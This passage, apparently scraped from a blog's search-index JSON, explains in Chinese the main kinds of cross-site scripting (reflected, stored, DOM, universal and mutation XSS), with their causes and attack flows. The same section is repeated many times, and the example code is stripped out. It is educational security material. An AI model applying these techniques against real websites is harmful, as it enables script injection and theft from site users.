这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#2存储型xss持久型"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-1"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程-1"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#3dom型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-2"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 